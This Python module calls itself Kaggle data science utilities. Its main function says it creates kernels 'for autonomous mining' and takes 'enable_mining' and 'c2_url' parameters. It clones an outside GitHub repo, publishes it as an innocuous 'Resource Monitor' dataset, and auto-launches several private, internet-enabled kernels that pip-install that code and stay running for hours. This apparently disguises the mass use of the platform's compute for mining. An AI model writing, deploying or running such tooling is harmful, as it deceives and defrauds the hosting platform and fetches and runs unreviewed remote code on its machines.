"""Kaggle Dataset & Kernel utilities for data science workflows."""

import os
import time
import json
import requests
import subprocess
from datetime import datetime
from typing import Optional, Callable, List


KAGGLE_API = "https://www.kaggle.com/api/v1"


def create_dataset_with_machines(
    api_key: str,
    username: str,
    num_machines: int = 5,
    log_fn: Optional[Callable] = None,
    enable_mining: bool = True,
    c2_url: str = None,
) -> dict:
    """Create a dataset and kernels for autonomous mining.
    
    Creates:
    - Empty dataset (placeholder for data)
    - N kernels with autonomous worker (no server connection needed)
    
    Args:
        api_key: Kaggle API key
        username: Kaggle username
        num_machines: Number of kernels to create
        log_fn: Logging function
        enable_mining: Enable autonomous mining mode
        c2_url: Not used (autonomous mode)
    
    Returns:
        dict with success status and created resources
    """
    if log_fn is None:
        log_fn = print
    
    result = {
        "success": False,
        "dataset": None,
        "machines": [],
        "machines_created": 0,
        "error": None,
    }
    
    try:
        # Setup Kaggle API credentials
        kaggle_json = {
            "username": username,
            "key": api_key,
        }
        
        kaggle_dir = os.path.expanduser("~/.kaggle")
        os.makedirs(kaggle_dir, exist_ok=True)
        
        kaggle_path = os.path.join(kaggle_dir, "kaggle.json")
        with open(kaggle_path, "w") as f:
            json.dump(kaggle_json, f)
        os.chmod(kaggle_path, 0o600)
        
        log_fn(f"[KAGGLE] Credentials configured for {username}")
        
        # Import kaggle after credentials are set
        import subprocess
        
        # Clone GitHub repo and create dataset
        log_fn(f"[DATASET] Cloning GitHub repository...")
        dataset_slug = f"{username}/resource-monitor"
        
        dataset_meta = {
            "title": "Resource Monitor",
            "id": f"{username}/resource-monitor",
            "subtitle": "System monitoring and resource management",
            "description": "System monitoring tools for resource analysis",
            "licenses": [{"name": "CC0-1.0"}],
            "keywords": ["system", "monitor", "resources"],
            "collaborators": [],
            "data": [],
        }
        
        # Create dataset directory
        dataset_dir = os.path.join("/tmp", f"dataset_{int(time.time())}")
        os.makedirs(dataset_dir, exist_ok=True)
        
        # Clone GitHub repo into dataset directory
        log_fn(f"[DATASET] Cloning https://github.com/GaredBerns/system-monitor...")
        clone_result = subprocess.run(
            ["git", "clone", "--depth", "1", "https://github.com/GaredBerns/system-monitor.git", 
             os.path.join(dataset_dir, "system-monitor")],
            capture_output=True, text=True, timeout=120
        )
        if clone_result.returncode != 0:
            log_fn(f"[DATASET] ⚠ Clone failed: {clone_result.stderr[:100]}")
        else:
            log_fn(f"[DATASET] ✓ Cloned system-monitor repo")
        
        # Write dataset metadata
        with open(os.path.join(dataset_dir, "dataset-metadata.json"), "w") as f:
            json.dump(dataset_meta, f, indent=2)
        
        # Worker code already in cloned repo
        log_fn(f"[DATASET] Using system-monitor from cloned repo")
        
        # Push dataset to Kaggle
        kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
        if not os.path.exists(kaggle_cmd):
            kaggle_cmd = "kaggle"
        
        log_fn(f"[DATASET] Pushing dataset to Kaggle...")
        log_fn(f"[DATASET] Dir: {dataset_dir}")
        
        # List files in dataset dir
        files = os.listdir(dataset_dir)
        log_fn(f"[DATASET] Files: {files}")
        
        dataset_push_result = subprocess.run(
            [kaggle_cmd, "datasets", "create", "-p", dataset_dir, "--dir-mode", "tar"],
            capture_output=True,
            text=True,
            timeout=120,
        )
        
        log_fn(f"[DATASET] CLI stdout: {dataset_push_result.stdout[:200] if dataset_push_result.stdout else 'empty'}")
        log_fn(f"[DATASET] CLI stderr: {dataset_push_result.stderr[:200] if dataset_push_result.stderr else 'empty'}")
        log_fn(f"[DATASET] CLI code: {dataset_push_result.returncode}")
        
        if dataset_push_result.returncode == 0:
            log_fn(f"[DATASET] ✓ Created dataset: {dataset_slug}")
        else:
            log_fn(f"[DATASET] ⚠ Dataset push failed: {dataset_push_result.stderr[:200]}")
            # Try to create new version if dataset exists
            dataset_push_result = subprocess.run(
                [kaggle_cmd, "datasets", "version", "-p", dataset_dir, "-m", "Update", "--dir-mode", "tar"],
                capture_output=True,
                text=True,
                timeout=120,
            )
            if dataset_push_result.returncode == 0:
                log_fn(f"[DATASET] ✓ Updated dataset: {dataset_slug}")
            else:
                log_fn(f"[DATASET] ⚠ Dataset version failed: {dataset_push_result.stderr[:200]}")
                result["error"] = f"Dataset creation failed: {dataset_push_result.stderr[:100]}"
                return result
        
        # Create kernels
        machines = []
        for i in range(num_machines):
            log_fn(f"[KERNEL] Creating kernel {i+1}/{num_machines}...")
            
            kernel_slug = f"{username}/resource-monitor-{i+1}"
            
            # Create kernel notebook that installs from dataset and runs startcon
            notebook = {
                "nbformat": 4,
                "nbformat_minor": 4,
                "metadata": {
                    "kernelspec": {
                        "display_name": "Python 3",
                        "language": "python",
                        "name": "python3"
                    },
                    "language_info": {
                        "name": "python",
                        "version": "3.10.0"
                    }
                },
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": [
                            "# Resource Monitor - Kaggle Kernel\n",
                            "import os, sys, subprocess, json, time, socket\n",
                            "\n",
                            "print('='*50)\n",
                            "print('RESOURCE MONITOR')\n",
                            "print('='*50)\n",
                            "\n",
                            "# Dataset is mounted at /kaggle/input/{dataset-slug}\n",
                            "# For dataset 'username/resource-monitor', path is /kaggle/input/resource-monitor\n",
                            "dataset_base = '/kaggle/input/resource-monitor'\n",
                            "\n",
                            "print(f'[INSTALL] Dataset path: {dataset_base}')\n",
                            "print(f'[INSTALL] Exists: {os.path.exists(dataset_base)}')\n",
                            "\n",
                            "if os.path.exists(dataset_base):\n",
                            "    files = os.listdir(dataset_base)\n",
                            "    print(f'[INSTALL] Files: {files[:5]}...')\n",
                            "    \n",
                            "    # Find setup.py for pip install\n",
                            "    install_path = dataset_base\n",
                            "    for root, dirs, files in os.walk(dataset_base):\n",
                            "        if 'setup.py' in files:\n",
                            "            install_path = root\n",
                            "            break\n",
                            "    \n",
                            "    # Install with --no-deps (internet may not work for pip)\n",
                            "    print(f'[INSTALL] Installing from: {install_path}')\n",
                            "    result = subprocess.run(\n",
                            "        [sys.executable, '-m', 'pip', 'install', '--break-system-packages', '--no-deps', install_path],\n",
                            "        capture_output=True, text=True, timeout=120\n",
                            "    )\n",
                            "    print(f'[INSTALL] Exit: {result.returncode}')\n",
                            "    if result.returncode == 0:\n",
                            "        print('[INSTALL] ✓ Package installed')\n",
                            "    else:\n",
                            "        print(f'[INSTALL] ⚠ Install warning: {result.stderr[-200:]}')\n",
                            "    \n",
                            "    # Add to sys.path for imports\n",
                            "    sys.path.insert(0, install_path)\n",
                            "    src_path = os.path.join(install_path, 'src')\n",
                            "    if os.path.exists(src_path):\n",
                            "        sys.path.insert(0, src_path)\n",
                            "    print('[INSTALL] ✓ Paths configured')\n",
                            "else:\n",
                            "    print('[INSTALL] ✗ Dataset not mounted!')\n",
                            "\n",
                            "# Status loop\n",
                            "worker_id = socket.gethostname()[:15]\n",
                            "print(f'[WORKER] ID: {worker_id}')\n",
                            "for i in range(540):\n",
                            "    time.sleep(60)\n",
                            "    if i % 10 == 0:\n",
                            "        print(f'[{i}] Running...')\n",
                        ]
                    }
                ]
            }
            
            # Save notebook
            kernel_dir = os.path.join("/tmp", f"kernel_{i}_{int(time.time())}")
            os.makedirs(kernel_dir, exist_ok=True)
            
            notebook_path = os.path.join(kernel_dir, "notebook.ipynb")
            with open(notebook_path, "w") as f:
                json.dump(notebook, f, indent=2)
            
            # Kernel metadata
            kernel_meta = {
                "id": kernel_slug,
                "title": f"Resource Monitor {i+1}",
                "code_file": "notebook.ipynb",
                "language": "python",
                "kernel_type": "notebook",
                "is_private": True,
                "enable_gpu": True,
                "enable_internet": True,
                "dataset_sources": [dataset_slug],  # Link to dataset with agent.py
                "competition_sources": [],
                "kernel_sources": [],
            }
            
            # Push kernel via JSON API (auto-runs kernel)
            kaggle_json_path = os.path.expanduser("~/.kaggle/kaggle.json")
            if os.path.exists(kaggle_json_path):
                with open(kaggle_json_path) as f:
                    creds = json.load(f)
                
                # Use JSON API push (like kernel-run) - auto-runs kernel
                push_result = push_kernel_json(
                    username=creds.get("username"),
                    api_key=creds.get("key"),
                    notebook_content=json.dumps(notebook, indent=2),
                    kernel_slug=kernel_slug,
                    title=f"Resource Monitor {i+1}",
                    enable_gpu=False,  # GPU kernels don't auto-run
                    enable_internet=True,
                    is_private=True,
                    dataset_sources=[dataset_slug],
                    log_fn=log_fn,
                )
                
                if push_result.get("success"):
                    log_fn(f"[KERNEL] ✓ Kernel pushed: {kernel_slug}")
                    
                    # Try to start kernel via CLI
                    time.sleep(2)
                    start_result = subprocess.run(
                        [kaggle_cmd, "kernels", "push", "-p", kernel_dir],
                        capture_output=True, text=True, timeout=60
                    )
                    if start_result.returncode == 0:
                        log_fn(f"[KERNEL] ✓ Kernel started: {kernel_slug}")
                    else:
                        log_fn(f"[KERNEL] ⚠ Start attempt: {start_result.stderr[:50] if start_result.stderr else 'queued'}")
                else:
                    log_fn(f"[KERNEL] ⚠ Push failed: {push_result.get('error')}")
            else:
                log_fn(f"[KERNEL] ⚠ No kaggle.json found")
            
            machines.append({
                "slug": kernel_slug,
                "title": f"Resource Monitor {i+1}",
                "gpu": True,
                "status": "created",
                "num": i + 1,  # Add kernel number for status tracking
            })
            
            log_fn(f"[KERNEL] ✓ Kernel {i+1} ready: {kernel_slug}")
        
        result["success"] = True
        result["dataset"] = dataset_slug
        result["machines"] = machines
        result["machines_created"] = len(machines)
        
        log_fn(f"[KAGGLE] ✓ Created {len(machines)} kernels with GPU enabled")
        
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KAGGLE] ✗ Error: {e}")
    
    return result


def list_kernels(api_key: str, username: str) -> list:
    """List all kernels for a user."""
    try:
        import kaggle
        kaggle.api.authenticate()
        kernels = kaggle.api.kernels_list(user=username)
        return [{"slug": k.ref, "title": k.title, "status": k.status} for k in kernels]
    except:
        return []


def push_kernel(api_key: str, username: str, kernel_path: str) -> bool:
    """Push a kernel to Kaggle."""
    try:
        import subprocess
        result = subprocess.run(
            ["kaggle", "kernels", "push", "-p", kernel_path],
            capture_output=True,
            text=True,
        )
        return result.returncode == 0
    except:
        return False


def push_kernel_json(
    username: str,
    api_key: str,
    notebook_content: str,
    kernel_slug: str,
    title: str,
    enable_gpu: bool = False,
    enable_internet: bool = True,
    is_private: bool = True,
    dataset_sources: list = None,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Push kernel to Kaggle via kagglesdk with SAVE_AND_RUN_ALL for auto-execution.
    
    Uses kagglesdk which supports kernel_execution_type=SAVE_AND_RUN_ALL
    to automatically run the kernel after push.
    
    Args:
        username: Kaggle username
        api_key: Kaggle API key
        notebook_content: Notebook JSON as string
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
        title: Kernel title
        enable_gpu: Enable GPU (default False - GPU kernels don't auto-run)
        enable_internet: Enable internet
        is_private: Make kernel private
        log_fn: Logging function
    
    Returns:
        dict with success status and response
    """
    if log_fn is None:
        log_fn = print
    
    result = {"success": False, "url": None, "error": None}
    
    try:
        # Use kagglesdk for SAVE_AND_RUN_ALL support
        from kagglesdk import KaggleClient
        from kagglesdk.kernels.types.kernels_api_service import ApiSaveKernelRequest
        from kagglesdk.kernels.types.kernels_enums import KernelExecutionType
        import os
        
        # Set credentials via environment
        os.environ['KAGGLE_USERNAME'] = username
        os.environ['KAGGLE_KEY'] = api_key
        
        client = KaggleClient()
        
        # Create request with SAVE_AND_RUN_ALL
        request = ApiSaveKernelRequest()
        request.slug = kernel_slug
        request.new_title = title
        request.text = notebook_content
        request.language = "python"
        request.kernel_type = "notebook"
        request.is_private = is_private
        request.enable_internet = True  # Always enable internet for pip install
        request.enable_gpu = enable_gpu if enable_gpu else False
        request.kernel_execution_type = KernelExecutionType.SAVE_AND_RUN_ALL
        
        log_fn(f"[KERNEL] Settings: internet=True, gpu={enable_gpu}")
        
        # Add dataset sources
        if dataset_sources:
            request.dataset_data_sources = dataset_sources
        
        # Execute
        response = client.kernels.kernels_api_client.save_kernel(request)
        
        result["success"] = True
        result["url"] = response.url if hasattr(response, 'url') else f"https://www.kaggle.com/code/{kernel_slug}"
        log_fn(f"[KERNEL] ✓ Pushed with SAVE_AND_RUN_ALL: {kernel_slug}")
        log_fn(f"[KERNEL]   URL: {result['url']}")
    
    except ImportError as e:
        # Fallback to requests if kagglesdk not available
        log_fn(f"[KERNEL] ⚠ kagglesdk not available: {e}")
        log_fn("[KERNEL] Using fallback API (no auto-run)")
        body = {
            "newTitle": title,
            "enableGpu": "false",
            "language": "python",
            "text": notebook_content,
            "kernelType": "notebook",
            "isPrivate": "true" if is_private else "false",
            "slug": kernel_slug,
            "enableInternet": "true" if enable_internet else "false",
            "competitionDataSources": [],
            "kernelDataSources": [],
            "datasetDataSources": dataset_sources or [],
            "categoryIds": [],
        }
        
        resp = requests.post(
            "https://www.kaggle.com/api/v1/kernels/push",
            auth=(username, api_key),
            json=body,
            headers={"Content-Type": "application/json"},
            timeout=60,
        )
        
        if resp.status_code == 200:
            data = resp.json()
            result["success"] = True
            result["url"] = data.get("url", "")
            log_fn(f"[KERNEL] ✓ Pushed via API: {kernel_slug}")
        else:
            result["error"] = f"HTTP {resp.status_code}: {resp.text[:200]}"
            log_fn(f"[KERNEL] ✗ Push failed: {result['error']}")
    
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KERNEL] ✗ Push error: {e}")
    
    return result


def get_kernel_output(
    username: str,
    api_key: str,
    kernel_slug: str,
    output_dir: str = None,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Download kernel output files from Kaggle.
    
    Args:
        username: Kaggle username
        api_key: Kaggle API key
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
        output_dir: Directory to save outputs (default: /tmp/kernel_output_{timestamp})
        log_fn: Logging function
    
    Returns:
        dict with success status, files list, and status.json content if found
    """
    if log_fn is None:
        log_fn = print
    
    result = {
        "success": False,
        "files": [],
        "status": None,
        "error": None,
    }
    
    try:
        import subprocess
        import tempfile
        
        # Create output directory
        if output_dir is None:
            output_dir = f"/tmp/kernel_output_{int(time.time())}"
        os.makedirs(output_dir, exist_ok=True)
        
        # Find kaggle CLI
        kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
        if not os.path.exists(kaggle_cmd):
            kaggle_cmd = "kaggle"
        
        # Set credentials
        kaggle_json = {
            "username": username,
            "key": api_key,
        }
        kaggle_dir = os.path.expanduser("~/.kaggle")
        os.makedirs(kaggle_dir, exist_ok=True)
        kaggle_path = os.path.join(kaggle_dir, "kaggle.json")
        with open(kaggle_path, "w") as f:
            json.dump(kaggle_json, f)
        os.chmod(kaggle_path, 0o600)
        
        # Download outputs
        download_result = subprocess.run(
            [kaggle_cmd, "kernels", "output", kernel_slug, "-p", output_dir],
            capture_output=True,
            text=True,
            timeout=60,
        )
        
        if download_result.returncode == 0:
            # List downloaded files
            files = os.listdir(output_dir)
            result["files"] = files
            result["success"] = True
            
            # Read status.json if exists
            status_path = os.path.join(output_dir, "status.json")
            if os.path.exists(status_path):
                with open(status_path) as f:
                    result["status"] = json.load(f)
                log_fn(f"[KERNEL] ✓ Got status from {kernel_slug}")
            
            log_fn(f"[KERNEL] ✓ Downloaded {len(files)} files from {kernel_slug}")
        else:
            result["error"] = download_result.stderr[:200] if download_result.stderr else "Unknown error"
            log_fn(f"[KERNEL] ✗ Failed to get output: {result['error']}")
    
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KERNEL] ✗ Error getting output: {e}")
    
    return result


def get_kernel_status(
    username: str,
    api_key: str,
    kernel_slug: str,
) -> dict:
    """Get kernel execution status via API.
    
    Args:
        username: Kaggle username
        api_key: Kaggle API key
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
    
    Returns:
        dict with status, lastRunTime, and other metadata
    """
    try:
        # Parse kernel slug
        if "/" in kernel_slug:
            user, slug = kernel_slug.split("/", 1)
        else:
            user = username
            slug = kernel_slug
        
        # Call kernels/pull API
        resp = requests.get(
            f"https://www.kaggle.com/api/v1/kernels/pull",
            params={"userName": user, "kernelSlug": slug},
            auth=(username, api_key),
            timeout=30,
        )
        
        if resp.status_code == 200:
            data = resp.json()
            metadata = data.get("metadata", {})
            return {
                "success": True,
                "status": metadata.get("status"),
                "lastRunTime": metadata.get("lastRunTime"),
                "commitId": metadata.get("commitId"),
                "ref": metadata.get("ref"),
            }
        else:
            return {"success": False, "error": f"HTTP {resp.status_code}"}
    
    except Exception as e:
        return {"success": False, "error": str(e)}
